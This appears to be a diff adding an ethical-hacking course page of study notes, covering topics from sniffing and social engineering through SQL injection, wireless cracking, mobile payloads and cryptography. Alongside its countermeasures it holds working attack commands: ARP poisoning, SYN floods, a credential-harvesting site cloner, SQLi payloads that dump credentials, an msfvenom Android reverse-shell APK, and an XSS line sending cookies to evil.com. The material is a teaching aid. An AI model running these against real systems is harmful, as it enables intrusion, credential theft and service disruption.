+<li><strong>Static Analysis:</strong> Examine without running. Check hashes (VirusTotal), strings (BinText), PE headers (PE Explorer), disassembly (IDA, Ghidra).</li>
+<li><strong>Dynamic Analysis:</strong> Run in sandbox and observe behavior. Monitor network, file system, registry changes. Tools: Cuckoo Sandbox, Any.run, Process Monitor, Wireshark.</li>
+</ul>
+
+<pre># Hash analysis
+$ md5sum malware.exe                      # Calculate MD5
+$ sha256sum malware.exe                   # Calculate SHA-256
+# Upload hash to VirusTotal for detection
+
+# Strings analysis — find readable text in binary
+$ strings malware.exe | grep -i "http\|url\|password\|cmd"
+# BinText (Windows GUI tool) does the same
+
+# PE Header analysis — PE Explorer or PEview
+# Shows: Imports (what DLLs/functions malware uses),
+# Sections (.text=code, .data=variables, .rsrc=resources),
+# Compilation timestamp, Entry point</pre>
+
+</div></div>
+
+<!-- ═══ SESSION 11 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S11</span><h2>Sniffing</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Sniffing Attacks</h3>
+<div class="tbl"><table>
+<tr><th>Attack</th><th>How</th><th>Tool</th></tr>
+<tr><td><strong>MAC Flooding</strong></td><td>Overwhelm switch CAM table → switch becomes hub, broadcasts everything</td><td><code>macof</code></td></tr>
+<tr><td><strong>ARP Poisoning</strong></td><td>Send fake ARP replies → redirect traffic through attacker (MITM)</td><td>arpspoof, Ettercap, Bettercap</td></tr>
+<tr><td><strong>DHCP Starvation</strong></td><td>Exhaust DHCP pool with fake requests → set up rogue DHCP</td><td>Yersinia, DHCPig</td></tr>
+<tr><td><strong>DNS Poisoning</strong></td><td>Fake DNS responses → redirect to malicious site</td><td>Ettercap, dnsspoof</td></tr>
+<tr><td><strong>MAC Spoofing</strong></td><td>Change your MAC to impersonate another device</td><td>macchanger, ifconfig</td></tr>
+</table></div>
+
+<pre># ARP Poisoning (MITM)
+$ echo 1 > /proc/sys/net/ipv4/ip_forward  # Enable forwarding
+$ arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1
+# Now all traffic between .10 and gateway flows through you
+# Capture with Wireshark or tcpdump
+
+# MAC Flooding
+$ macof -i eth0                            # Floods switch CAM table
+
+# DHCP Starvation
+$ yersinia dhcp -attack 1 -i eth0
+
+# MAC Spoofing
+$ macchanger -r eth0                       # Random MAC
+$ macchanger -m AA:BB:CC:DD:EE:FF eth0     # Specific MAC
+
+# Password Sniffing
+# If traffic is unencrypted (HTTP, FTP, Telnet):
+# Wireshark → Filter: http.request.method == "POST"
+# Follow TCP Stream → credentials visible in cleartext</pre>
+
+<h4>Countermeasures</h4>
+<p>Port Security (limit MACs per port), Dynamic ARP Inspection (DAI), DHCP Snooping, 802.1X (port-based authentication), Encrypt everything (HTTPS, SSH, VPN), Static ARP entries for critical servers.</p>
+
+</div></div>
+
+<!-- ═══ SESSION 12 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S12</span><h2>Social Engineering</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Social Engineering Techniques</h3>
+<p>Manipulating <strong>people</strong> instead of technology. The weakest link in security is always the human.</p>
+<div class="tbl"><table>
+<tr><th>Technique</th><th>How</th></tr>
+<tr><td><strong>Phishing</strong></td><td>Fake emails/websites to steal credentials</td></tr>
+<tr><td><strong>Spear Phishing</strong></td><td>Targeted phishing at specific individuals</td></tr>
+<tr><td><strong>Whaling</strong></td><td>Phishing targeting executives (CEO, CFO)</td></tr>
+<tr><td><strong>Vishing</strong></td><td>Voice phishing (phone calls)</td></tr>
+<tr><td><strong>Smishing</strong></td><td>SMS phishing</td></tr>
+<tr><td><strong>Pretexting</strong></td><td>Creating a fake scenario to extract info</td></tr>
+<tr><td><strong>Baiting</strong></td><td>Leaving infected USB drives for victims to plug in</td></tr>
+<tr><td><strong>Tailgating</strong></td><td>Following authorized person through secured door</td></tr>
+<tr><td><strong>Quid Pro Quo</strong></td><td>"I'll fix your computer if you give me your password"</td></tr>
+<tr><td><strong>Dumpster Diving</strong></td><td>Searching through trash for sensitive info</td></tr>
+<tr><td><strong>Shoulder Surfing</strong></td><td>Looking over someone's shoulder for passwords</td></tr>
+</table></div>
+
+<pre># Social Engineering Toolkit (SET)
+$ sudo setoolkit
+# 1) Social-Engineering Attacks
+#    → 2) Website Attack Vectors
+#       → 3) Credential Harvester
+#          → 2) Site Cloner
+# Enter URL to clone (e.g., https://gmail.com)
+# SET creates a fake copy on your IP
+# When victim enters credentials, SET captures them
+
+# ShellPhish (phishing tool)
+$ shellphish
+# Select platform → generates phishing link</pre>
+
+<h4>Countermeasures</h4>
+<p>Security awareness training, Phishing simulations, MFA, Email filtering (SPF/DKIM/DMARC), Strict visitor policies, Paper shredding, Verify identities before sharing info.</p>
+
+</div></div>
+
+<!-- ═══ SESSION 13-14 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S13-14</span><h2>Denial-of-Service (DoS/DDoS)</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>DoS vs DDoS</h3>
+<p><strong>DoS:</strong> Single source overwhelms a target. <strong>DDoS:</strong> Multiple sources (botnet) — much harder to stop.</p>
+
+<h4>Attack Types</h4>
+<div class="tbl"><table>
+<tr><th>Category</th><th>Attack</th><th>Layer</th><th>How</th></tr>
+<tr><td>Volumetric</td><td>UDP Flood, ICMP Flood, Amplification (DNS, NTP, Memcached)</td><td>3-4</td><td>Saturate bandwidth</td></tr>
+<tr><td>Protocol</td><td>SYN Flood, Ping of Death, Smurf, Teardrop</td><td>3-4</td><td>Exhaust server resources</td></tr>
+<tr><td>Application</td><td>HTTP Flood, Slowloris, R-U-Dead-Yet (RUDY)</td><td>7</td><td>Exhaust application resources</td></tr>
+</table></div>
+
+<pre># SYN Flood using hping3 (LAB ONLY)
+$ hping3 -S --flood -p 80 target.com
+$ hping3 -S --flood -p 80 -a 1.2.3.4 target.com  # Spoofed source
+
+# SYN Flood using Metasploit
+msf6> use auxiliary/dos/tcp/synflood
+msf6> set RHOST target.com
+msf6> set RPORT 80
+msf6> run</pre>
+
+<h4>Botnets</h4>
+<p>Network of compromised machines ("zombies") controlled by attacker via C2 (Command and Control) server. Used for DDoS, spam, cryptomining. Notable: Mirai (IoT botnet), Emotet.</p>
+
+<h4>DDoS Protection</h4>
+<p>Rate limiting, SYN cookies, Ingress filtering (BCP38), CDN/Scrubbing (Cloudflare, Akamai, AWS Shield), IPS, Blackhole routing, Over-provisioning bandwidth.</p>
+
+</div></div>
+
+<!-- ═══ SESSION 15 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S15</span><h2>Session Hijacking</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Session Hijacking Concepts</h3>
+<p>Attacker takes over a valid user session. The user already authenticated — attacker steals the session token/cookie and impersonates them.</p>
+
+<h4>Application-Level Hijacking</h4>
+<ul>
+<li><strong>Session Token Prediction:</strong> Guess the next session ID (weak randomness)</li>
+<li><strong>Session Fixation:</strong> Force user to use a known session ID</li>
+<li><strong>XSS-based:</strong> Steal cookies via JavaScript injection</li>
+<li><strong>Session Sniffing:</strong> Capture cookies from unencrypted traffic</li>
+<li><strong>MITM:</strong> Intercept traffic and steal/modify session data</li>
+</ul>
+
+<h4>Network-Level Hijacking</h4>
+<ul>
+<li><strong>TCP Hijacking:</strong> Predict sequence numbers to inject packets into established TCP connection</li>
+<li><strong>IP Spoofing:</strong> Impersonate trusted IP</li>
+<li><strong>RST Hijacking:</strong> Send RST to disconnect one party, take over</li>
+</ul>
+
+<pre># ZAP (Zed Attack Proxy)
+# 1. Configure browser proxy → ZAP (127.0.0.1:8080)
+# 2. Browse target application
+# 3. ZAP captures all requests/responses
+# 4. Inspect cookies and session tokens
+# 5. Use "Resend" to replay requests with stolen tokens
+
+# Bettercap — MITM + HTTP traffic interception
+$ bettercap -iface eth0
+» net.probe on                            # Discover hosts
+» set arp.spoof.targets 192.168.1.10
+» arp.spoof on                            # ARP poison
+» set net.sniff.local true
+» net.sniff on                            # Sniff traffic</pre>
+
+<h4>Countermeasures</h4>
+<p>HTTPS everywhere, Secure cookie flags (HttpOnly, Secure, SameSite), Session timeout, Regenerate session ID after login, Bind session to IP/User-Agent, CSP headers, Token rotation.</p>
+
+</div></div>
+
+<!-- ══════════════════════════════════════════════ -->
+<div class="phase phase-p">🟣 Sessions 16–28 — Advanced: Evasion, Web, SQL, Wireless, Cloud, Crypto</div>
+<!-- ══════════════════════════════════════════════ -->
+
+<!-- ═══ SESSION 16-17 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-p">S16-17</span><h2>Evading IDS, Firewalls &amp; Honeypots</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>IDS/IPS/Firewall Concepts</h3>
+<div class="tbl"><table>
+<tr><th>System</th><th>Function</th><th>Types</th></tr>
+<tr><td><strong>Firewall</strong></td><td>Filter traffic based on rules (IP, port, protocol)</td><td>Packet Filter, Stateful, Application/Proxy, NGFW</td></tr>
+<tr><td><strong>IDS</strong></td><td>Detect intrusions and ALERT (passive — doesn't block)</td><td>NIDS (network-based), HIDS (host-based)</td></tr>
+<tr><td><strong>IPS</strong></td><td>Detect and BLOCK intrusions (inline — active)</td><td>Same as IDS but inline</td></tr>
+</table></div>
+<p><strong>Detection methods:</strong> Signature-based (known patterns), Anomaly-based (deviations from baseline), Heuristic (behavior rules).</p>
+
+<h4>IDS Evasion Techniques</h4>
+<ul>
+<li><strong>Fragmentation:</strong> Split attack across multiple fragments</li>
+<li><strong>Encryption:</strong> Encrypt traffic (SSL/TLS tunneling)</li>
+<li><strong>Obfuscation:</strong> Encode payload (URL encoding, Unicode, double encoding)</li>
+<li><strong>Low-and-slow:</strong> Attack slowly to stay under rate thresholds</li>
+<li><strong>Polymorphic shellcode:</strong> Changes form each time</li>
+<li><strong>Decoys:</strong> Generate lots of false positives to overwhelm analysts</li>
+</ul>
+
+<h4>Honeypots</h4>
+<p>Decoy systems designed to attract attackers. Purpose: Detect attacks, Study attacker behavior, Divert from real systems. <strong>Low-interaction:</strong> Simulates services (Honeyd). <strong>High-interaction:</strong> Full real system (more risk, more intel).</p>
+
+<pre># Snort — Open-source IDS
+$ sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
+
+# Bypass firewall with Nmap
+$ nmap -f target.com                      # Fragment packets
+$ nmap -D RND:10 target.com              # Decoys
+$ nmap --source-port 53 target.com        # Source port 53 (DNS)
+$ nmap -sS -T1 target.com                # Slow timing
+
+# SSH Tunneling through firewall
+$ ssh -D 1080 user@jump_server            # SOCKS proxy
+$ ssh -L 8080:internal:80 user@jump_server # Port forwarding</pre>
+
+</div></div>
+
+<!-- ═══ SESSION 18-19 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-p">S18-19</span><h2>Hacking Web Servers</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Web Server Attacks</h3>
+<div class="tbl"><table>
+<tr><th>Attack</th><th>Description</th></tr>
+<tr><td><strong>Directory Traversal</strong></td><td><code>../../etc/passwd</code> — access files outside web root</td></tr>
+<tr><td><strong>Misconfiguration</strong></td><td>Default credentials, directory listing, verbose errors</td></tr>
+<tr><td><strong>HTTP Response Splitting</strong></td><td>Inject headers via CRLF injection</td></tr>
+<tr><td><strong>Web Cache Poisoning</strong></td><td>Poison cache to serve malicious content</td></tr>
+<tr><td><strong>Server-Side Request Forgery</strong></td><td>Force server to make requests to internal resources</td></tr>
+<tr><td><strong>Brute Force</strong></td><td>Crack FTP/SSH/HTTP login credentials</td></tr>
+</table></div>
+
+<pre># ═══ Web Server Reconnaissance ═══
+$ whatweb target.com                      # Technology fingerprinting
+$ nikto -h https://target.com             # Vulnerability scanner
+$ skipfish -o output_dir https://target.com  # Active recon
+$ nmap --script http-enum target.com      # HTTP enumeration
+
+# ═══ Banner Grabbing ═══
+$ nc -nv target.com 80
+HEAD / HTTP/1.1
+Host: target.com
+
+$ httprecon target.com                    # HTTP fingerprinting
+$ curl -I target.com                      # Headers
+
+# ═══ Directory Bruteforce ═══
+$ gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
+$ dirb https://target.com
+$ feroxbuster -u https://target.com -w wordlist.txt
+
+# ═══ FTP Brute Force ═══
+$ hydra -l admin -P rockyou.txt ftp://target.com
+$ nmap --script ftp-brute target.com</pre>
+
+<h4>Web Server Hardening Checklist</h4>
+<p>Remove default pages, Disable directory listing, Remove server version from headers, Disable unnecessary HTTP methods (PUT, DELETE, TRACE), Keep patched, Implement WAF, Use HTTPS, Restrict admin panel access, Log everything.</p>
+
+</div></div>
+
+<!-- ═══ SESSION 20 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-p">S20</span><h2>Hacking Web Applications</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>OWASP Top 10 (2021)</h3>
+<div class="tbl"><table>
+<tr><th>#</th><th>Vulnerability</th><th>Description</th></tr>
+<tr><td>A01</td><td><strong>Broken Access Control</strong></td><td>Users access unauthorized functions/data (IDOR, privilege escalation)</td></tr>
+<tr><td>A02</td><td><strong>Cryptographic Failures</strong></td><td>Sensitive data exposed (weak encryption, cleartext storage)</td></tr>
+<tr><td>A03</td><td><strong>Injection</strong></td><td>SQLi, XSS, Command injection, LDAP injection</td></tr>
+<tr><td>A04</td><td><strong>Insecure Design</strong></td><td>Missing security controls in design phase</td></tr>
+<tr><td>A05</td><td><strong>Security Misconfiguration</strong></td><td>Default credentials, open cloud storage, verbose errors</td></tr>
+<tr><td>A06</td><td><strong>Vulnerable Components</strong></td><td>Outdated libraries, unpatched software</td></tr>
+<tr><td>A07</td><td><strong>Auth Failures</strong></td><td>Weak passwords, session issues, credential stuffing</td></tr>
+<tr><td>A08</td><td><strong>Data Integrity Failures</strong></td><td>Insecure deserialization, CI/CD pipeline attacks</td></tr>
+<tr><td>A09</td><td><strong>Logging Failures</strong></td><td>No logging, no alerting, no monitoring</td></tr>
+<tr><td>A10</td><td><strong>SSRF</strong></td><td>Server fetches attacker-controlled URL, accesses internals</td></tr>
+</table></div>
+
+<h4>Key Web Attacks</h4>
+
+<p><strong>XSS (Cross-Site Scripting):</strong> Inject JavaScript into web pages viewed by other users.</p>
+<pre># Reflected XSS (in URL, not stored)
+https://target.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# Stored XSS (saved in database, affects all viewers)
+Comment box: &lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;
+
+# DOM-based XSS (modifies page DOM)
+# Payload manipulates client-side JavaScript</pre>
+
+<p><strong>CSRF (Cross-Site Request Forgery):</strong> Force authenticated user to perform unwanted actions.</p>
+<pre># Attacker's page contains:
+&lt;img src="https://bank.com/transfer?to=attacker&amount=10000"&gt;
+# When victim (logged into bank) visits attacker's page,
+# browser automatically sends the request WITH victim's cookies</pre>
+
+<pre># ═══ Web App Recon ═══
+$ whatweb target.com
+# OWASP ZAP: Spider → Active Scan → Review alerts
+# Burp Suite: Proxy → Intercept → Modify requests → Repeater
+
+# ═══ Burp Suite ═══
+# 1. Set browser proxy to 127.0.0.1:8080
+# 2. Browse target → Burp captures requests
+# 3. Send to Repeater → Modify parameters → Send
+# 4. Intruder → Brute force / Parameter tampering
+# 5. Scanner → Automated vulnerability scanning</pre>
+
+</div></div>
+
+<!-- ═══ SESSION 21-22 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-p">S21-22</span><h2>SQL Injection</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>SQL Basics for SQLi</h3>
+<pre># DDL (Data Definition Language)
+CREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(255));
+ALTER TABLE users ADD email VARCHAR(100);
+DROP TABLE users;
+
+# DML (Data Manipulation Language)
+SELECT * FROM users WHERE username='admin';
+INSERT INTO users VALUES (1, 'admin', 'pass123');
+UPDATE users SET password='newpass' WHERE id=1;
+DELETE FROM users WHERE id=1;
+
+# DCL (Data Control Language)
+GRANT SELECT ON users TO 'webuser';
+REVOKE ALL ON users FROM 'webuser';</pre>
+
+<h3>SQL Injection Types</h3>
+<div class="tbl"><table>
+<tr><th>Type</th><th>How It Works</th><th>Visibility</th></tr>
+<tr><td><strong>In-Band (Classic)</strong></td><td>Results shown directly on the page</td><td>Direct feedback</td></tr>
+<tr><td>→ Union-Based</td><td>Use UNION to append extra SELECT queries</td><td>Data in page</td></tr>
+<tr><td>→ Error-Based</td><td>Force SQL errors that leak information</td><td>In error messages</td></tr>
+<tr><td><strong>Blind SQLi</strong></td><td>No visible output — infer from behavior</td><td>Indirect</td></tr>
+<tr><td>→ Boolean-Based</td><td>TRUE/FALSE changes page content</td><td>Content differs</td></tr>
+<tr><td>→ Time-Based</td><td>SLEEP() delays response if TRUE</td><td>Response time</td></tr>
+<tr><td><strong>Out-of-Band</strong></td><td>Data sent to attacker's server (DNS, HTTP)</td><td>External channel</td></tr>
+</table></div>
+
+<h4>SQLi Step by Step</h4>
+<pre># Step 1: Test for vulnerability
+' OR '1'='1                               # Always true
+' OR '1'='1' --                           # Comment out rest
+' OR '1'='1' #                            # MySQL comment
+
+# Step 2: Determine number of columns (for UNION)
+' ORDER BY 1-- ✓
+' ORDER BY 2-- ✓
+' ORDER BY 3-- ✓
+' ORDER BY 4-- ✗ (error → 3 columns exist)
+
+# Step 3: Find displayable columns
+' UNION SELECT 1,2,3--
+# See which numbers appear on page (e.g., 2 and 3)
+
+# Step 4: Extract information
+' UNION SELECT 1,version(),database()--         # DB version + name
+' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,username,password FROM users--  # Dump credentials!
+
+# Error-Based (MySQL)
+' AND extractvalue(1,concat(0x7e,version()))--
+
+# Boolean-Based Blind
+' AND SUBSTRING(database(),1,1)='a'--        # Is first char 'a'?
+
+# Time-Based Blind
+' AND IF(1=1,SLEEP(5),0)--                  # 5 second delay = TRUE</pre>
+
+<h4>SQLMap — Automated SQLi</h4>
+<pre>$ sqlmap -u "http://target.com/page?id=1" --dbs
+# --dbs: list databases
+$ sqlmap -u "http://target.com/page?id=1" -D webapp --tables
+# --tables: list tables in database
+$ sqlmap -u "http://target.com/page?id=1" -D webapp -T users --dump
+# --dump: extract all data from table
+$ sqlmap -u "http://target.com/page?id=1" --os-shell
+# --os-shell: get OS command execution (if possible)</pre>
+
+<h4>Prevention</h4>
+<p><strong>Parameterized queries / Prepared statements</strong> (NEVER concatenate user input into SQL), Input validation, Least privilege DB accounts, WAF, Error handling (don't show SQL errors), ORM usage.</p>
+
+</div></div>
+
+<!-- ═══ SESSION 23 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-p">S23</span><h2>Hacking Wireless Networks</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Wireless Hacking Methodology</h3>
+<ol>
+<li>Discover networks (airodump-ng, NetSurveyor, Wash)</li>
+<li>Identify target (SSID, BSSID, Channel, Encryption)</li>
+<li>Capture handshake (deauth attack + capture WPA handshake)</li>
+<li>Crack key (aircrack-ng + wordlist, or hashcat)</li>
+<li>Post-exploitation (MITM, sniffing)</li>
+</ol>
+
+<pre># ═══ Aircrack-ng Suite ═══
+# Step 1: Put adapter in Monitor mode
+$ sudo airmon-ng start wlan0              # Creates wlan0mon
+
+# Step 2: Scan for networks
+$ sudo airodump-ng wlan0mon
+# Shows: BSSID, Channel, Encryption, ESSID, connected clients
+
+# Step 3: Target specific network and capture handshake
+$ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Step 4: Force handshake by deauthenticating a client
+$ sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+# -0 5 = send 5 deauth packets
+
+# Step 5: Crack the captured handshake
+$ aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+# OR use Hashcat (faster with GPU)
+$ hcxpcapngtool capture-01.cap -o hash.hc22000
+$ hashcat -m 22000 hash.hc22000 rockyou.txt
+
+# ═══ Finding Hidden SSIDs ═══
+$ sudo airodump-ng wlan0mon
+# Hidden SSIDs show as &lt;length: 0&gt;
+# Wait for a client to connect OR send deauth to force reconnection
+# SSID revealed in probe request/response
+
+# ═══ WEP Cracking (much easier) ═══
+$ sudo airodump-ng -c 6 --bssid AA:BB:CC -w wep_capture wlan0mon
+$ sudo aireplay-ng -3 -b AA:BB:CC wlan0mon   # ARP replay
+# Collect ~40,000+ IVs
+$ aircrack-ng wep_capture-01.cap</pre>
+
+<h4>Bluetooth Hacking</h4>
+<p><strong>Bluejacking:</strong> Send unsolicited messages. <strong>Bluesnarfing:</strong> Steal data from Bluetooth device. <strong>Bluebugging:</strong> Full control of device. Use: <code>hciconfig</code>, <code>hcitool scan</code>, <code>btscanner</code>.</p>
+
+</div></div>
+
+<!-- ═══ SESSION 24 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-p">S24</span><h2>Hacking Mobile Platforms</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Mobile Attack Vectors</h3>
+<p><strong>OWASP Mobile Top 10:</strong> Improper Platform Usage, Insecure Data Storage, Insecure Communication, Insecure Authentication, Insufficient Cryptography, Insecure Authorization, Client Code Quality, Code Tampering, Reverse Engineering, Extraneous Functionality.</p>
+
+<h4>Android Security Architecture</h4>
+<p>Linux kernel → HAL → Android Runtime (ART) → Framework → Apps. Each app runs in its own sandbox (separate UID). Permissions model. APK = ZIP file containing classes.dex + resources + manifest.</p>
+
+<h4>Android Hacking</h4>
+<pre># ADB (Android Debug Bridge)
+$ adb devices                             # List connected devices
+$ adb shell                               # Shell access
+$ adb install malicious.apk               # Install app
+$ adb pull /sdcard/DCIM/ ./photos/        # Extract files
+$ adb logcat                              # View device logs
+$ adb shell pm list packages              # List installed apps
+$ adb shell dumpsys activity              # Running activities
+
+# Metasploit Android Payload
+$ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o evil.apk
+# Start handler:
+msf6> use exploit/multi/handler
+msf6> set PAYLOAD android/meterpreter/reverse_tcp
+msf6> set LHOST 192.168.1.5
+msf6> run
+# When victim installs evil.apk → Meterpreter session opens</pre>
+
+</div></div>
+
+<!-- ═══ SESSION 25 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-p">S25</span><h2>IoT Hacking</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>IoT Concepts &amp; Attacks</h3>
+<p><strong>IoT:</strong> Internet of Things — smart devices (cameras, thermostats, medical devices, industrial sensors) connected to the internet. Often have weak security.</p>
+
+<h4>IoT Attack Surface</h4>
+<ul>
+<li><strong>Device:</strong> Default credentials, Firmware vulnerabilities, Physical access (JTAG, UART)</li>
+<li><strong>Communication:</strong> Unencrypted protocols (MQTT, CoAP), Bluetooth, Zigbee, Z-Wave</li>
+<li><strong>Cloud/Backend:</strong> Insecure APIs, Weak authentication</li>
+<li><strong>Ecosystem:</strong> Lack of updates, No patch mechanism</li>
+</ul>
+
+<h4>IoT Hacking Tools</h4>
+<p><strong>Shodan:</strong> Search for exposed IoT devices worldwide. <strong>Censys:</strong> Internet scan data. <strong>MQTT Explorer:</strong> Connect to MQTT brokers. <strong>Firmware analysis:</strong> Binwalk (extract filesystem), Firmwalker (search for secrets).</p>
+
+<pre># Find IoT devices with Shodan
+# Search: "webcam" country:"IN"
+# Search: "default password" port:23
+# Search: "Server: GoAhead" (common IoT web server)
+
+# Capture IoT traffic
+$ wireshark -i wlan0 -f "port 1883"       # MQTT traffic
+# Analyze: credentials, commands, sensor data in cleartext</pre>
+
+</div></div>
+
+<!-- ═══ SESSION 26 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-p">S26</span><h2>Cloud Computing Security</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Cloud Models</h3>
+<div class="tbl"><table>
+<tr><th>Model</th><th>You Manage</th><th>Provider Manages</th><th>Example</th></tr>
+<tr><td><strong>IaaS</strong></td><td>OS, Apps, Data</td><td>Hardware, Network, Virtualization</td><td>AWS EC2, Azure VMs</td></tr>
+<tr><td><strong>PaaS</strong></td><td>Apps, Data</td><td>Runtime, OS, Hardware</td><td>Heroku, Azure App Service</td></tr>
+<tr><td><strong>SaaS</strong></td><td>Just use it</td><td>Everything</td><td>Gmail, Office 365, Salesforce</td></tr>
+</table></div>
+
+<h4>Cloud Threats</h4>
+<ul>
+<li><strong>Misconfiguration:</strong> Open S3 buckets, Public databases, Excessive permissions (by far #1 cloud risk)</li>
+<li><strong>IAM Abuse:</strong> Over-privileged accounts, Leaked API keys in GitHub</li>
+<li><strong>Data Breach:</strong> Insecure APIs, Cross-tenant attacks</li>
+<li><strong>Insecure APIs:</strong> Missing authentication, Injection via API params</li>
+<li><strong>Account Hijacking:</strong> Phishing for cloud credentials</li>
+</ul>
+
+<h4>Cloud Security</h4>
+<p><strong>Shared Responsibility Model:</strong> Provider secures the cloud infrastructure; YOU secure what you put IN the cloud (data, access, config). <strong>Best practices:</strong> MFA everywhere, Least privilege IAM, Encrypt at rest and in transit, Enable logging (CloudTrail, Azure Monitor), Regular config audits, CSPM tools (Prisma Cloud, AWS Security Hub).</p>
+
+</div></div>
+
+<!-- ═══ SESSION 27-28 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-p">S27-28</span><h2>Cryptography</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Cryptography Concepts</h3>
+<div class="tbl"><table>
+<tr><th>Type</th><th>How</th><th>Algorithms</th><th>Use</th></tr>
+<tr><td><strong>Symmetric</strong></td><td>Same key encrypts and decrypts</td><td>AES, DES, 3DES, Blowfish, RC4, ChaCha20</td><td>Bulk data encryption (fast)</td></tr>
+<tr><td><strong>Asymmetric</strong></td><td>Key pair: Public encrypts, Private decrypts</td><td>RSA, ECC, Diffie-Hellman, ElGamal</td><td>Key exchange, Digital signatures</td></tr>
+<tr><td><strong>Hashing</strong></td><td>One-way function → fixed-length digest</td><td>MD5, SHA-1, SHA-256, SHA-512, bcrypt</td><td>Integrity, Password storage</td></tr>
+</table></div>
+
+<h4>Key Concepts</h4>
+<ul>
+<li><strong>PKI (Public Key Infrastructure):</strong> System for managing digital certificates. Components: CA (Certificate Authority — issues certs), RA (Registration Authority — verifies identities), Certificate Store, CRL/OCSP (revocation checking).</li>
+<li><strong>Digital Signature:</strong> Hash message → encrypt hash with private key → attach to message. Verifier decrypts with public key → compares hashes. Provides: Authentication, Integrity, Non-repudiation.</li>
+<li><strong>SSL/TLS:</strong> Asymmetric for key exchange → Symmetric for data encryption. TLS 1.3 is current standard.</li>
+</ul>
+
+<h3>Practical — Cryptography</h3>
+<pre># ═══ Hashing ═══
+# HashCalc, MD5Calculator, HashMyFiles (Windows GUI tools)
+$ md5sum file.txt                         # MD5 hash
+$ sha256sum file.txt                      # SHA-256 hash
